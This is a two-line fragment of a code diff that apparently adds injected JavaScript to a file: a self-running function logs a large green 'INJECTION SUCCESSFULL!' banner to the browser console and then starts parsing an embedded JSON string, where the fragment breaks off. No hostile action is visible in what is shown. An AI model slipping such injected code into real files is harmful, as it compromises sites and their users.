@@ -1,0 +1,2 @@
+!function(){console.log("%c LMAO  - INJECTION SUCCESSFULL!","background:green;color:#fff;font-size:30px;");
+let e=JSON.parse(`
